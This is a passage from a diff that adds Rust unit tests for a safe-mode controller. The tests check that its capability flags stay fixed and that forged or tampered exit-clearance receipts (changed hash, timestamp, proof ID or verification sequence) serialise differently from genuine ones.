+            // Attempt to bypass via state manipulation (should be immutable)
+            let original_active = controller.is_safe_mode_active();
+
+            // These should not change the controller's behavior
+            let _debug_str = format!("{:?}", controller);
+            let _display_str = controller.to_string();
+            let _events = controller.events();
+
+            assert_eq!(controller.is_safe_mode_active(), original_active);
+            assert!(!controller.can_load_extensions());
+            assert!(!controller.can_issue_delegations());
+
+            // Test that capability checks are deterministic
+            let cap_check_1 = (
+                controller.can_load_extensions(),
+                controller.can_issue_delegations(),
+                controller.requires_trust_reverification(),
+            );
+
+            let cap_check_2 = (
+                controller.can_load_extensions(),
+                controller.can_issue_delegations(),
+                controller.requires_trust_reverification(),
+            );
+
+            assert_eq!(cap_check_1, cap_check_2, "Capability checks should be deterministic");
+        }
+    }
+
+    #[test]
+    fn negative_exit_clearance_receipt_forgery_and_tampering_resistance() {
+        // Test exit clearance receipt generation against forgery and tampering
+        let controller_result = SafeModeController::new(SafeModeEntryReason::TrustCorruption, 1000);
+
+        if let Ok(mut controller) = controller_result {
+            // Generate legitimate receipt
+            let legitimate_receipt = controller
+                .create_exit_clearance_receipt("sha256:legitimate_hash", 2000)
+                .expect("create legitimate receipt");
+
+            // Verify receipt integrity
+            assert!(!legitimate_receipt.proof_id.is_empty());
+            assert!(!legitimate_receipt.trust_state_hash.is_empty());
+            assert!(legitimate_receipt.timestamp_ms >= 2000);
+
+            // Attempt various tampering attacks
+            let tampering_attempts = vec![
+                // Modify trust state hash
+                ExitClearanceReceipt {
+                    proof_id: legitimate_receipt.proof_id.clone(),
+                    trust_state_hash: "sha256:tampered_hash".to_string(),
+                    timestamp_ms: legitimate_receipt.timestamp_ms,
+                    verification_sequence: legitimate_receipt.verification_sequence.clone(),
+                },
+
+                // Modify timestamp (replay attack)
+                ExitClearanceReceipt {
+                    proof_id: legitimate_receipt.proof_id.clone(),
+                    trust_state_hash: legitimate_receipt.trust_state_hash.clone(),
+                    timestamp_ms: 999, // Earlier timestamp
+                    verification_sequence: legitimate_receipt.verification_sequence.clone(),
+                },
+
+                // Modify proof ID
+                ExitClearanceReceipt {
+                    proof_id: "forged-proof-id".to_string(),
+                    trust_state_hash: legitimate_receipt.trust_state_hash.clone(),
+                    timestamp_ms: legitimate_receipt.timestamp_ms,
+                    verification_sequence: legitimate_receipt.verification_sequence.clone(),
+                },
+
+                // Empty verification sequence
+                ExitClearanceReceipt {
+                    proof_id: legitimate_receipt.proof_id.clone(),
+                    trust_state_hash: legitimate_receipt.trust_state_hash.clone(),
+                    timestamp_ms: legitimate_receipt.timestamp_ms,
+                    verification_sequence: vec![],
+                },
+            ];
+
+            // Test that tampering is detectable through serialization comparison
+            let legitimate_json = legitimate_receipt.to_json();
+
+            for (i, tampered_receipt) in tampering_attempts.iter().enumerate() {
+                let tampered_json = tampered_receipt.to_json();
+
+                // Tampered receipts should produce different serialization
+                assert_ne!(legitimate_json, tampered_json,
+                          "Tampering attempt {} should be detectable", i);
+
+                // JSON should still be well-formed
+                assert!(!tampered_json.is_empty());
+                assert!(tampered_json.contains("proof_id"));
+                assert!(tampered_json.contains("trust_state_hash"));
+
+                // Should not contain injection attempts
+                assert!(!tampered_json.contains('\0'));
+                assert!(!tampered_json.contains("<script>"));
+            }
+
+            // Test receipt generation with multiple calls (should be different each time)
+            let receipt2 = controller
+                .create_exit_clearance_receipt("sha256:legitimate_hash", 3000)
+                .expect("create second receipt");
+
+            // Should have different proof IDs (nonce-based)
+            assert_ne!(legitimate_receipt.proof_id, receipt2.proof_id);
+            assert_ne!(legitimate_receipt.timestamp_ms, receipt2.timestamp_ms);
+        }
     }
 }
